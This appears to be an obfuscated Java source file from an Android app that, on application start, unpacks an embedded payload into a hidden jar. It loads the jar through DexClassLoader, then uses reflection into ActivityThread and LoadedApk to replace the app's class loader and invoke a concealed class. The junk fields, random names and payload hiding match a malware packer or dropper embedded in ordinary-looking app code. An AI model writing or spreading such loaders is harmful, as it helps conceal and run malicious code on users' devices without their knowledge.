package com.makelist.market.slytherin36;

import android.content.Context;
import android.util.ArrayMap;

import java.io.File;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class Zdgrhmf {
    protected static int ivFLxT = 2406;
    protected static String GcExdtLOq = "HhEkCfFMivMKfThrKjNnMOLMWlseEMljGrqrcYnSRMaMT";
    private static int aGbHA = 797;
    protected static String zqkXXneKR = "hQcyUnDxEyacBmawBTedrBjdejy";
    public static String NwYCwx = "OuIGGpiE";
    protected static int rETpW = 2781;
    private static int RVvNkdTEMy = 8469;
    /**2 APPLICATION_ATTACHBASE*/
    public static void APPLICATIONATTACHBASE(Context lkj){

        if(Qdhfqjvrtr.Judgeadjustsch()){
            decompression(lkj);
            try {
                Class<?>  fas = MycocosAppLication.m_dcl.loadClass("yagsmq.rdwirnwvw");
                Method asdw = fas.getMethod("rzuula", new Class[] {Context.class });

                asdw.invoke(null, new Object[] {lkj});
            } catch (Exception dww){

                dww.printStackTrace();
            }
        }
    }
    private static int cafd() {   return 8326;    }
    private static String ylohynknb() {   return "cohUkeEwexAFYnB";    }
    private static int arbtksvet() {   return 9855;    }
    private static String hudcrbcfjs() {   return "RWpxIQh";    }
    private static int cbey() {   return 8506;    }
    public static Boolean ponwhfmvuj() {   return false;    }
    private static int eszlzowbw() {   return 5930;    }
    //插件打包方式的解包
    public static void decompression(Context cswq){
        try {

            String kiwjhf = cswq.getFilesDir().getAbsolutePath() + "/classes/";
            File dswcza = new File(kiwjhf);

            if (!dswcza.exists()) {
                dswcza.mkdirs();
            }

            Fpetojgwj.asncjwhqcxzw(cswq, sgsBotData.mkfjwkj23jf, kiwjhf + "/classdex.jar");

            Class dasw = Class.forName("android.app.ActivityThread");
            Method aa = dasw.getMethod("currentActivityThread",new Class[] {});
            Object ascw = aa.invoke(null, new Object[] {});


            Class dswfawfass = Class.forName("android.app.ActivityThread");
            Field casfw = dswfawfass.getDeclaredField("mPackages");
            casfw.setAccessible(true);
            ArrayMap ascwwvzxvzx = (ArrayMap) casfw.get(ascw);


            WeakReference sawwgg = (WeakReference) ascwwvzxvzx.get(cswq.getPackageName());
            MycocosAppLication.m_dcl = new DexClassLoader(kiwjhf + "/classdex.jar", kiwjhf, kiwjhf, cswq.getClassLoader());



            Class asdqw = Class.forName("android.app.LoadedApk");

            Field asdwqgbzbzx = asdqw.getDeclaredField("mClassLoader");
            asdwqgbzbzx.setAccessible(true);


            asdwqgbzbzx.set(sawwgg.get(), MycocosAppLication.m_dcl);
        } catch (Exception asfasf) {

            asfasf.printStackTrace();

        }
    }
    public static Boolean pnkmadji() {   return true;    }
    private static int ujmjvg() {   return 3824;    }
    private static Boolean yvomzcnnm() {   return true;    }
    private static int qrvzzxs() {   return 2566;    }

}